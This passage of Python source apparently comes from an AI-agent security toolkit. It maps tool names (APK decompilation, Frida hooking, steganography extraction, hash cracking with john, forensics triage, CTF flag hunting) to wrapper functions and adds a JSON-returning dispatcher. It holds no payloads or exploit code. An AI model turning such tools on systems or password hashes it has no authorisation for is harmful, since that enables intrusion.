    # ---- Cross-domain: mobile (Android) ----
    "apk_decompile": lambda args: apk_decompile(
        apk_path=args["apk_path"],
        engine=args.get("engine", "both"),
        out_dir=args.get("out_dir", ""),
        timeout=args.get("timeout", 300),
    ),
    "apk_analyze": lambda args: apk_analyze(
        source_dir=args["source_dir"],
        timeout=args.get("timeout", 120),
    ),
    "frida_hook": lambda args: frida_hook(
        target=args["target"],
        script=args["script"],
        spawn=args.get("spawn", True),
        device=args.get("device", "usb"),
        duration=args.get("duration", 15),
        timeout=args.get("timeout", 60),
    ),
    # ---- Cross-domain: CTF misc (crypto / stego / forensics / flags) ----
    "stego_extract": lambda args: stego_extract(
        file_path=args["file_path"],
        tool=args.get("tool", "auto"),
        passphrase=args.get("passphrase", ""),
        timeout=args.get("timeout", 120),
    ),
    "hash_crack": lambda args: hash_crack(
        hash_value=args.get("hash_value", ""),
        hash_file=args.get("hash_file", ""),
        hash_type=args.get("hash_type", ""),
        wordlist=args.get("wordlist", ""),
        tool=args.get("tool", "john"),
        timeout=args.get("timeout", 300),
    ),
    "crypto_helper": lambda args: crypto_helper(
        operation=args["operation"],
        data=args["data"],
        key=args.get("key", ""),
    ),
    "forensics_triage": lambda args: forensics_triage(
        file_path=args["file_path"],
        action=args.get("action", "auto"),
        timeout=args.get("timeout", 180),
    ),
    "flag_hunter": lambda args: flag_hunter(
        text=args.get("text", ""),
        file_path=args.get("file_path", ""),
        pattern=args.get("pattern", ""),
        timeout=args.get("timeout", 60),
    ),
}


def execute_tool(tool_name: str, arguments: dict[str, Any]) -> str:
    """
    Dispatch and execute a tool call by name.
    Returns the result as a JSON string.
    """
    if tool_name not in TOOL_FUNCTIONS:
        return json.dumps({
            "error": f"Unknown tool: {tool_name}",
            "available_tools": list(TOOL_FUNCTIONS.keys()),
        })

    try:
        return TOOL_FUNCTIONS[tool_name](arguments)
    except Exception as exc:
        return json.dumps({
            "error": f"Tool execution failed: {str(exc)}",
            "tool": tool_name,
            "arguments": arguments,
        })
